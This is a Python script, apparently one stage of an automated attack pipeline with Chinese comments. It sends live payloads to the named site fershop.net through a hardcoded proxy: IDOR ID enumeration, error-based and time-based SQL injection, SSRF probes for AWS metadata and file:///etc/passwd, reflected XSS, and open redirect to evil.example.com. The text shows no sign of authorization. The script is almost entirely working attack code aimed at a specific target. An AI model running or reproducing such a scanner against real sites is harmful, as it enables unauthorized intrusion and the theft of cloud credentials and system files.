"""
Step 2: 真实 payload 测试
- 对规则引擎筛出的高置信度突破口 (非 sitemap /admin /upload /api 路径), 实际发请求验证
- 跳过纯路径 IDOR (1525 -> 60 个抽样)
- 不再用 MultiChannelInjector (LLMClient 错误), 改用直接 payload
"""
import sys, time, json, re
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import requests
import urllib3
urllib3.disable_warnings()

OUT = Path(".pipeline_output")
PROXY = "http://3.211.120.181:443"
PROXIES = {"http": PROXY, "https": PROXY}
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0",
    "Accept": "*/*",
}


def probe(url, proxies=None, timeout=8, method="GET", data=None):
    try:
        kwargs = dict(timeout=timeout, verify=False, headers=HEADERS,
                     allow_redirects=True, proxies=proxies)
        if method == "POST" and data:
            kwargs["data"] = data
        if method == "GET":
            r = requests.get(url, **kwargs)
        else:
            r = requests.request(method, url, **kwargs)
        return r
    except Exception as e:
        return None


def test_idor_range(base_url, pid, proxies=None):
    """对路径 ID 探测 ±N / 999999 范围外"""
    p = urlparse(base_url)
    # 替换路径 ID
    base_path = re.sub(r'/\d{1,6}(?=/|$|\?)', f'/__PID__', p.path)
    targets = [
        ("in_range_minus1", urlunparse(p._replace(path=base_path.replace('__PID__', str(pid-1))))),
        ("in_range_plus1", urlunparse(p._replace(path=base_path.replace('__PID__', str(pid+1))))),
        ("out_of_range_max", urlunparse(p._replace(path=base_path.replace('__PID__', '99999')))),
        ("out_of_range_zero", urlunparse(p._replace(path=base_path.replace('__PID__', '0')))),
    ]
    results = []
    for label, url in targets:
        r = probe(url, proxies)
        if r is None:
            results.append({"label": label, "url": url, "status": "ERR", "len": 0})
        else:
            results.append({"label": label, "url": url, "status": r.status_code, "len": len(r.content)})
    return results


def test_sqli_param(url, param, value, proxies=None):
    """SQLi 时间型 + 错误型"""
    p = urlparse(url)
    params = parse_qs(p.query)
    out = []

    # 1. 单引号错误型
    params_bad = dict(params)
    params_bad[param] = value + "'"
    bad_url = urlunparse(p._replace(query=urlencode(params_bad, doseq=True)))
    r = probe(bad_url, proxies)
    if r:
        body = r.text.lower()
        for kw in ("sql syntax", "mysql", "ora-", "postgresql", "warning:",
                  "you have an error in your sql"):
            if kw in body:
                out.append({"payload": "single_quote", "url": bad_url,
                           "status": r.status_code, "len": len(r.content),
                           "signal": kw})
                break

    # 2. 时间型 -1 OR SLEEP(3)
    params_time = dict(params)
    if p.scheme in ("http", "https"):
        if "mysql" in HEADERS.get("User-Agent", ""):
            pass
        params_time[param] = f"-1 OR SLEEP(3)"
    time_url = urlunparse(p._replace(query=urlencode(params_time, doseq=True)))
    t0 = time.time()
    r = probe(time_url, proxies, timeout=12)
    elapsed = time.time() - t0
    if r and elapsed >= 3:
        out.append({"payload": "sleep_or", "url": time_url,
                   "status": r.status_code, "len": len(r.content),
                   "signal": f"sleep_elapsed={elapsed:.2f}s"})

    return out


def test_ssrf_param(url, param, value, proxies=None):
    """SSRF 探测 - 内部 metadata + file://"""
    p = urlparse(url)
    params = parse_qs(p.query)
    out = []

    # 1. 内网 metadata 169.254.169.254
    payloads = [
        ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
        ("file_proto", "file:///etc/passwd"),
        ("localhost", "http://127.0.0.1/"),
    ]
    for label, payload_url in payloads:
        params_ssrf = dict(params)
        params_ssrf[param] = payload_url
        test_url = urlunparse(p._replace(query=urlencode(params_ssrf, doseq=True)))
        r = probe(test_url, proxies)
        if r and r.status_code == 200:
            body = r.text.lower()
            for kw in ("ami-id", "instance-id", "root:x:", "localhost"):
                if kw in body:
                    out.append({"payload": label, "url": test_url,
                               "status": r.status_code, "len": len(r.content),
                               "signal": kw})
                    break

    return out


def test_reflected_xss(url, param, value, proxies=None):
    """反射型 XSS"""
    p = urlparse(url)
    params = parse_qs(p.query)
    params_x = dict(params)
    params_x[param] = "<aib_xss_test_81237>"
    x_url = urlunparse(p._replace(query=urlencode(params_x, doseq=True)))
    r = probe(x_url, proxies)
    if r and "<aib_xss_test_81237>" in r.text:
        return [{"payload": "reflected_xss", "url": x_url, "status": r.status_code,
                "len": len(r.content), "signal": "param_value_in_body"}]
    return []


def test_open_redirect(url, param, proxies=None):
    """开放重定向 - Location header 检测"""
    p = urlparse(url)
    params = parse_qs(p.query)
    params_r = dict(params)
    params_r[param] = "https://evil.example.com/oauth-callback"
    r_url = urlunparse(p._replace(query=urlencode(params_r, doseq=True)))
    r = probe(r_url, proxies, timeout=6)
    if r and r.status_code in (301, 302, 303, 307, 308):
        loc = r.headers.get("Location", "")
        if "evil.example.com" in loc:
            return [{"payload": "open_redirect", "url": r_url, "status": r.status_code,
                    "len": len(r.content), "signal": f"Location={loc}"}]
    return []


def main():
    journal_file = OUT / "fershop_net_traffic_journal.json"
    if not journal_file.exists():
        print("ERR: journal 不存在, 先跑 Phase ②")
        return
    with open(journal_file) as f:
        entries = json.load(f)
    print(f"加载 TrafficJournal: {len(entries)} 条")

    # === A. IDOR 路径抽样 (在 1525 中每 50 抽 1 个 catalog/product) ===
    print()
    print("=" * 70)
    print("[A] IDOR 范围测试 - 抽样 catalog/product/ID")
    print("=" * 70)
    idor_candidates = [e for e in entries
                       if e["ok"] and "/catalog/product/" in e["url"]]
    print(f"  catalog/product 路径总数: {len(idor_candidates)}")

    # 抽样 30 个
    sample = idor_candidates[::max(1, len(idor_candidates) // 30)][:30]
    idor_results = []
    for i, e in enumerate(sample, 1):
        url = e["url"]
        pid_match = re.search(r'/catalog/product/(\d+)', url)
        if not pid_match:
            continue
        pid = int(pid_match.group(1))
        rs = test_idor_range(url, pid, proxies=PROXIES)
        # 判定: in_range 与 out_of_range 都 200 → 弱访问控制 (待确认)
        # in_range_plus1/minus1 是 200 而 out_of_range_max 是 404 → 商品ID 是顺序的
        # 但 out_of_range_max 也是 200 → IDOR 确认 (商品越界仍能访问)
        # out_of_range_zero 是 200 → 弱访问控制
        all_200 = all(r["status"] == 200 for r in rs)
        all_404 = all(r["status"] == 404 for r in rs)
        confirmed = all_200 and any(r["label"] in ("out_of_range_max", "out_of_range_zero") for r in rs)
        if confirmed or (rs[0]["status"] == 200 and rs[2]["status"] == 200):
            print(f"  [{i}] ⚠️ 可能 IDOR: pid={pid}")
            for r in rs:
                print(f"      {r['label']:18s} {r['status']} {r['len']:>6}B")
            idor_results.append({"pid": pid, "tests": rs})
        if i % 10 == 0:
            print(f"  [{i}/{len(sample)}] done")

    print(f"\n  IDOR 命中数: {len(idor_results)}")
    with open(OUT / "fershop_idor_results.json", "w") as f:
        json.dump(idor_results, f, indent=2)

    # === B. SQLi 参数测试 - 找所有带参数的 ok 资产 ===
    print()
    print("=" * 70)
    print("[B] SQLi 参数测试 - 抽样 URL 含参数")
    print("=" * 70)
    sqli_candidates = [e for e in entries
                       if e["ok"] and e.get("params")]
    print(f"  含参数 ok 资产: {len(sqli_candidates)}")
    sqli_results = []
    sample_b = sqli_candidates[:40]
    for i, e in enumerate(sample_b, 1):
        url = e["url"]
        for pname, pval in e["params"].items():
            results = test_sqli_param(url, pname, pval, proxies=PROXIES)
            if results:
                print(f"  [{i}] ✅ SQLi 信号: {url[:60]} param={pname}")
                for r in results:
                    print(f"      payload={r['payload']} signal={r['signal']}")
                sqli_results.append({"url": url, "param": pname, "results": results})
    print(f"\n  SQLi 命中: {len(sqli_results)}")
    with open(OUT / "fershop_sqli_results.json", "w") as f:
        json.dump(sqli_results, f, indent=2)

    # === C. 反射型 XSS ===
    print()
    print("=" * 70)
    print("[C] 反射型 XSS - 抽样 URL 含参数")
    print("=" * 70)
    xss_candidates = sqli_candidates
    xss_results = []
    sample_c = xss_candidates[:30]
    for i, e in enumerate(sample_c, 1):
        url = e["url"]
        for pname, pval in e["params"].items():
            results = test_reflected_xss(url, pname, pval, proxies=PROXIES)
            if results:
                print(f"  [{i}] ✅ XSS 信号: {url[:60]} param={pname}")
                xss_results.append({"url": url, "param": pname, "results": results})
    print(f"\n  XSS 命中: {len(xss_results)}")
    with open(OUT / "fershop_xss_results.json", "w") as f:
        json.dump(xss_results, f, indent=2)

    # === D. SSRF ===
    print()
    print("=" * 70)
    print("[D] SSRF 测试 - 抽样 URL 含 url/redirect/callback 参数")
    print("=" * 70)
    ssrf_candidates = [e for e in sqli_candidates
                       if any(p in e["params"] for p in
                             ("url", "redirect", "callback", "next", "imageurl", "site"))]
    print(f"  SSRF 可疑资产: {len(ssrf_candidates)}")
    ssrf_results = []
    for i, e in enumerate(ssrf_candidates[:20], 1):
        url = e["url"]
        for pname in ("url", "redirect", "callback", "next", "imageurl", "site"):
            if pname in e["params"]:
                results = test_ssrf_param(url, pname, e["params"][pname], proxies=PROXIES)
                if results:
                    print(f"  [{i}] ✅ SSRF: {url[:60]} param={pname}")
                    ssrf_results.append({"url": url, "param": pname, "results": results})
    print(f"\n  SSRF 命中: {len(ssrf_results)}")
    with open(OUT / "fershop_ssrf_results.json", "w") as f:
        json.dump(ssrf_results, f, indent=2)

    # === E. Open Redirect ===
    print()
    print("=" * 70)
    print("[E] Open Redirect 测试 - 抽样 URL 含 redirect 参数")
    print("=" * 70)
    redirect_candidates = [e for e in sqli_candidates
                          if any(p in e["params"] for p in
                                ("redirect", "redirect_uri", "next", "return", "url", "goto"))]
    print(f"  Redirect 可疑资产: {len(redirect_candidates)}")
    redirect_results = []
    for i, e in enumerate(redirect_candidates[:20], 1):
        url = e["url"]
        for pname in ("redirect", "redirect_uri", "next", "return", "url", "goto"):
            if pname in e["params"]:
                results = test_open_redirect(url, pname, proxies=PROXIES)
                if results:
                    print(f"  [{i}] ✅ Open Redirect: {url[:60]} param={pname}")
                    redirect_results.append({"url": url, "param": pname, "results": results})
    print(f"\n  Open Redirect 命中: {len(redirect_results)}")
    with open(OUT / "fershop_redirect_results.json", "w") as f:
        json.dump(redirect_results, f, indent=2)

    # === F. 总结 ===
    print()
    print("=" * 70)
    print("🎯 fershop.net Payload 测试总结")
    print("=" * 70)
    print(f"  IDOR 命中: {len(idor_results)} (路径 ID 范围越界)")
    print(f"  SQLi 命中: {len(sqli_results)} (单引号/时间盲注信号)")
    print(f"  XSS 命中: {len(xss_results)} (参数值反射)")
    print(f"  SSRF 命中: {len(ssrf_results)} (metadata/file:// 信号)")
    print(f"  Open Redirect 命中: {len(redirect_results)} (Location 头重定向)")


if __name__ == "__main__":
    main()
